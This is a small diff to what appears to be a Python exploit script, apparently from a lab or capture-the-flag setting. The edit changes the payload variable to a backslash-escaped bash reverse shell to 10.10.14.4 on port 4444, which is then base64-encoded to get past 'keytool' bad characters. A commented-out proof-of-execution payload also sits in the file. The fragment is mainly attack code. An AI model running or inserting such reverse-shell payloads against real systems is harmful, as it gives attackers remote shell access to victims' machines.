@@ -13,7 +13,7 @@ from base64 import b64encode
 
 # Change me
 #payload = 'echo "Code execution as $(id)" > /tmp/win'
-payload = 'bash -i >& /dev/tcp/0.10.14.33/4444 0>&1'
+payload = 'bash \-i \>\& \/dev\/tcp\/10\.10\.14\.4\/4444 0\>\&1'
 
 # b64encode to avoid badchars (keytool is picky)
 payload_b64 = b64encode(payload.encode()).decode()
